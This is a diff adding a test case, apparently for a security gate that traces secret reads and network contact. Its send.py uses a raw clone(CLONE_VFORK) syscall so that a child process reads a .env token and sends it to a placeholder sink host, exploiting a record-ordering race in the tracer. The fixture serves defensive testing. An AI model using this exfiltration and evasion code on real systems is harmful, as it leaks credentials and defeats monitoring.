@@ -1,0 +1,40 @@
+# A child whose creator is held inside its creating call: `clone(CLONE_VFORK)`
+# suspends the parent until the child exits, so the parent's call cannot finish
+# before the child reads the secret and contacts the external host. The tracer
+# orders a new task's records after its creator's call; if the gate judged the
+# child's contact without those still-unordered records, the read would not yet
+# count and the canary would leave.
+name = "vfork-child-read-exfil"
+kind = "attack"
+policy = "recommended"
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "send.py"
+contents = """
+import ctypes, os, socket
+CLONE_VFORK, SIGCHLD, SYS_clone = 0x4000, 17, 56  # x86_64
+libc = ctypes.CDLL(None, use_errno=True)
+# Without CLONE_VM the child has its own copy of memory, so it may run Python.
+pid = libc.syscall(SYS_clone, CLONE_VFORK | SIGCHLD, 0, 0, 0, 0)
+if pid == 0:
+    try:
+        secret = open(".env", "rb").read()
+        s = socket.socket()
+        s.connect(("{SINK_HOST}", {SINK_PORT}))
+        s.sendall(secret)
+    finally:
+        os._exit(0)
+os.waitpid(pid, 0)
+"""
+
+[[steps]]
+shell = 0
+run = "python3 send.py"
+expect = "any"
+
+[oracle]
+encodings = ["raw", "base64", "hex"]
